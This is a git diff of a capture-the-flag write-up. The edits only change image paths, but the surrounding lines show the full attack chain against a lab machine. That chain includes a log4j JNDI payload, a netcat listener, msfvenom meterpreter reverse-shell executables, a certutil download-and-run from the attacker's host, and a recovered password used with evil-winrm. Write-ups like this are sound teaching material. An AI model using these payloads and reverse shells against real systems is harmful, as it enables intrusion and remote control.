@@ -18,7 +18,7 @@ sudo nmap -p- -T5 -v 10.10.11.249
 
 The output will be:
 
-![](assets/img/posts/20250817005419-png-svg.svg))
+![](assets/img/posts/20250817005419-png))
 
 I need to add this to my hosts file: `/etc/hosts`
 ```
@@ -73,14 +73,14 @@ The LDAP server can now be setup to get ready for the log4j exploit
 python3 poc.py --userip 10.10.16.42 --webport 80 --lport 4444
 ```
 
-![](assets/img/posts/20250817005630-png-svg.svg))
+![](assets/img/posts/20250817005630-png))
 
 Now I can enter the link into pyCraft for the exploit the log4j vulnerability and grant myself a shell
 ```
 sudo python3 start.py -u abdo -s 10.10.11.249
 ```
 
-![](assets/img/posts/20250817005642-png-svg.svg))
+![](assets/img/posts/20250817005642-png))
 copy: `${jndi:ldap://10.10.16.42:1389/a}` from` poc.py` terminal, and paste it in `start.py` terminal, after we see **connected** word is appeared
 
 Setup a listener to catch our shell. I used `rlwrap`
@@ -88,7 +88,7 @@ Setup a listener to catch our shell. I used `rlwrap`
 sudo rlwrap nc -lvnp 4444
 ```
 
-![](assets/img/posts/20250817005727-png-svg.svg))
+![](assets/img/posts/20250817005727-png))
 
 We got a shell !
 
@@ -110,7 +110,7 @@ so I'm going to try another way, lets generate a reverse shell
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4244 -f exe -o expl.exe 
 ```
 
-![](assets/img/posts/20250817005812-png-svg.svg))
+![](assets/img/posts/20250817005812-png))
 
 Then setup a Metasploit listener
 ```
@@ -132,7 +132,7 @@ certutil -urlcache -f http://10.10.16.42:4245/expl.exe %temp%/expl.exe
 start %temp%/expl.exe              # to run our reverse shell
 ```
 
-![](assets/img/posts/20250817005900-png-svg.svg))
+![](assets/img/posts/20250817005900-png))
 
 A meterpreter session should open on the Metasploit handler terminal
 
@@ -146,11 +146,11 @@ A meterpreter session should open on the Metasploit handler terminal
 
 So lets open the Decompiler and Click on File > Open File. Find the `playercounter-1.0-SNAPSHOT.jar` file and open it
 
-![](assets/img/posts/20250817005957-png-svg.svg))
+![](assets/img/posts/20250817005957-png))
 
 After reading the code, and analysis it in a hurry. This looks like a password: `s67u84zKq8IXw`
 
-![](assets/img/posts/20250817010010-png-svg.svg))
+![](assets/img/posts/20250817010010-png))
 
 Let's try remoting in with evil-winrm.
 ```
@@ -167,7 +167,7 @@ Now create another msfvenom payload but for another port 4246
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.42 LPORT=4246 -f exe -o expl2.exe
 ```
 
-![](assets/img/posts/20250817010041-png-svg.svg))
+![](assets/img/posts/20250817010041-png))
 
 On the meterpreter session you can try uploading to `\server\plugins` but it won't work because of permissions.
 
